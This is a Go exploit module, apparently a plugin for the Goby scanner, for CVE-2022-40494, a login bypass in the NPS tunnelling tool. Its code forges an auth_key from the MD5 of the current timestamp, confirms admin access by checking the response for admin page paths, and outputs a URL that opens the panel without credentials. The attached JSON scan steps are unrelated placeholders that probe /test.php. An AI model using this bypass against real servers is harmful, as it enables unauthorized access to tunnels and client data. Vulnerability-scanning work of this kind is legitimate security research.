package exploits

import (
  	"crypto/md5"
	"fmt"
	"strings"
	"time"
	"git.gobies.org/goby/goscanner/goutils"
  	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "NPS Permission Bypass Vulnerability (CVE-2022-40494)",
    "Description": "<p>NPS tool is a lightweight and powerful Intranet penetration tool written in go language.</p><p>At present, NPS has a login bypass vulnerability, through which sensitive data can be obtained, allowing attackers to further carry out more harmful attacks.</p>",
    "Product": "nps",
    "Homepage": "https://github.com/ehang-io/nps",
    "DisclosureDate": "2022-08-04",
    "PostTime": "2023-07-31",
    "Author": "469978772@qq.com",
    "FofaQuery": "body=\"window.nps =\"",
    "GobyQuery": "body=\"window.nps =\"",
    "Level": "3",
    "Impact": "<p>An attacker can bypass the vulnerability through an NPS login, which can gain access to sensitive data and ultimately leave the system in a highly insecure state.</p>",
    "Recommendation": "<p>1. Please go to the official homepage to upgrade to the latest version: <a href=\"https://github.com/ehang-io/nps/releases\">https://github.com/ehang-io/nps/releases</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2022-40494 "
    ],
    "CNNVD": [
        "CNNVD-202210-244"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "NPS 权限绕过漏洞（CVE-2022-40494 ）",
            "Product": "nps",
            "Description": "<p>NPS 工具是一个用go语言编写的轻量级且功能强大的内网渗透工具。</p><p>当下 NPS 存在登录绕过漏洞，可以通过该漏洞获取敏感数据，使攻击者获得进一步进行危害更高的攻击的可能。</p>",
            "Recommendation": "<p>1、请至官方主页升级至最新版本 ：<a href=\"https://github.com/ehang-io/nps/releases\">https://github.com/ehang-io/nps/releases</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过NPS 登录绕过漏洞，可获取敏感数据，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "NPS Permission Bypass Vulnerability (CVE-2022-40494)",
            "Product": "nps",
            "Description": "<p>NPS tool is a lightweight and powerful Intranet penetration tool written in go language.</p><p>At present, NPS has a login bypass vulnerability, through which sensitive data can be obtained, allowing attackers to further carry out more harmful attacks.</p>",
            "Recommendation": "<p>1. Please go to the official homepage to upgrade to the latest version: <a href=\"https://github.com/ehang-io/nps/releases\">https://github.com/ehang-io/nps/releases</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>An attacker can bypass the vulnerability through an NPS login, which can gain access to sensitive data and ultimately leave the system in a highly insecure state.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			now := time.Now().Unix()
			authKey := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%d", now))))

			uri := fmt.Sprintf("/Index/Index?auth_key=%s&timestamp=%d", authKey, now)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				stepLogs.VulURL = u.FixedHostInfo + uri
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/index/socks5") &&
					strings.Contains(resp.Utf8Html, "/index/http") && strings.Contains(resp.Utf8Html, "/client/list")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			now := time.Now().Unix()
			authKey := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%d", now))))

			uri := fmt.Sprintf("/Index/Index?auth_key=%s&timestamp=%d", authKey, now)

			expResult.Success = true
			expResult.Output = "Please Open This URL: " + expResult.HostInfo.FixedHostInfo + uri

			return expResult
		},
	))
}